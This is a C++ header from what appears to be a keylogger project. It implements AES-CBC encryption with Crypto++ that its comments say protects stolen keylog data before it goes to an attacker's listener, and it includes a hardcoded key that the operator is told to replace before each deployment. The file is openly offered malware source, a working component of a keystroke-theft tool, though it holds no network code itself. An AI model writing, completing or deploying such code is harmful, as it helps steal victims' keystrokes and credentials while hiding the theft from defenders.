#ifndef TRANSFORMER_H
#define TRANSFORMER_H

#include <vector>
#include <string>
#include "crypto-headers/cryptlib.h"
#include "crypto-headers/rijndael.h"
#include "crypto-headers/modes.h"
#include "crypto-headers/files.h"
#include "crypto-headers/osrng.h"
#include "crypto-headers/hex.h"

/*

This header file will include the functionality used to encrypt data after it is
collected but before it is sent to the attacker's listener

*/

namespace Transformer
{

	// This key must be changed with the output of "python3 toms-server.py --mode keygen" before each deployment
	
	std::string keyStr = "5367566B5970337336763979244226452948404D6351655468576D5A71347437";

	// AES groundwork for keys, ivs, and random numbers
	
	static constexpr size_t AES_KEY_SIZE = 256 / 8;
	
	std::vector<uint8_t> key(AES_KEY_SIZE);	
	std::vector<uint8_t> iv(CryptoPP::AES::BLOCKSIZE);
	
	CryptoPP::AutoSeededRandomPool randNumGen;
	
	// Method prototypes for ease of understanding

	std::string aesEncrypt(std::string plainText);
	std::string byteArrayToHexString(std::vector<uint8_t> &vector);
	std::vector<uint8_t> hexStringToByteArray(std::string hex);
	std::string getIV();

	/* 
	
	The aesEncrypt function will make use of the publicly available Crypto++ library
	to encrypt the keylog data that will be sent to the listener running on the attacker machine

	Instructions: 
	
	Compilation/Linking -> https://www.ired.team/miscellaneous-reversing-forensics/aes-encryption-example-using-cryptopp-.lib-in-visual-studio-c++ 
	
	Encryption/Decryption -> https://petanode.com/posts/brief-introduction-to-cryptopp/
	
	Hex/Byte Conversion -> 
	
	https://www.cryptopp.com/wiki/HMAC
	https://stackoverflow.com/questions/17261798/converting-a-hex-string-to-a-byte-array

	*/

	std::string aesEncrypt(std::string plainText)
	{
		// Can't securley transfer AES key, so I will just make the user preset it b4 compilation
		// randNumGen.GenerateBlock(key.data(), key.size());
		
		randNumGen.GenerateBlock(iv.data(), iv.size());
		key = hexStringToByteArray(keyStr);

		auto aesData = CryptoPP::AES::Encryption(key.data(), key.size());
		auto cbcData = CryptoPP::CBC_Mode_ExternalCipher::Encryption(aesData, iv.data());
		std::string cipherText;

		CryptoPP::StringSource(plainText, true,
			new CryptoPP::StreamTransformationFilter(cbcData,
				new CryptoPP::HexEncoder(
					new CryptoPP::StringSink(cipherText)
					)
				)
			);

		return cipherText;
	}

	std::string byteArrayToHexString(std::vector<uint8_t> &vector)
	{
		std::string hexEncoded;
		hexEncoded.clear();
		
		CryptoPP::StringSource sourceOne(vector.data(), vector.size(), true,
			new CryptoPP::HexEncoder(
				new CryptoPP::StringSink(hexEncoded)
				)
			);

		return hexEncoded;
	}

	std::vector<uint8_t> hexStringToByteArray(std::string hex)
	{
		std::vector<uint8_t> byteArray;

		for (unsigned int i = 0; i < hex.length(); i += 2) {
			std::string byteString = hex.substr(i, 2);
			char byte = (char)strtol(byteString.c_str(), NULL, 16);
			byteArray.push_back(byte);
		}

		return byteArray;

	}

	std::string getIV()
	{
		return byteArrayToHexString(iv);
	}

}

#endif // !TRANSFORMER_H